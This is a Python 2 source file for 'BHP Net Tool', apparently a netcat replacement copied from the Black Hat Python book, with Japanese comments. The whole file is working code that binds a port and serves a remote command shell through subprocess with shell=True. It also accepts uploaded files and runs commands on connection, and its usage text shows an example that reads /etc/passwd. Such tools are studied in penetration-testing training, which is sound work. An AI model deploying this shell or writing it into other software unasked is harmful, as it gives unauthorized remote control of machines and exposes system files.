#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

# グローバル変数の定義
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for"
    print "                           incoming connections"
    print "-e --execute=file_to_run - execute the given file upon"
    print "                           receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a"
    print "                           file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]): #if no command-line argument
        usage()
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu:", #single characters to be matched as opts. character with ':'means that the opt takes one arg.
            ["help","listen","execute=","target=", #strings to be matched as opts. character with = means the opt takes one arg.
            "port=","command","upload="])

    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o,a in opts:
        if o in ("-h" , "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a;
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            #get data from target host:port
            recv_len = 1
            response = ""
            while recv_len:
                data        = client.recv(4096)
                recv_len    = len(data)
                response    +=data

                if recv_len < 4096 :
                    break

            print response,

            buffer = raw_input("")
            buffer += "\n"

            client.send(buffer)
    except:
        print "[*] EXCEPTION! Exiting..."
        client.close()



def server_loop():
    global target
    if not len(target):
        target = "0.0.0.0" #if no ip address designated, wait connection for all interface
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        print "listening"
        client_socket, addr = server.accept()

        client_thread = threading.Thread(
            target = client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    #delete \n 
    command = command.rstrip()

    # execute command and fetch output result
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command. \r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(
                "Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send(
                "Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:

        prompt = "<BHP:#>"
        client_socket.send(prompt)

        while True:
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            response += prompt

            client_socket.send(response)
        


main()




























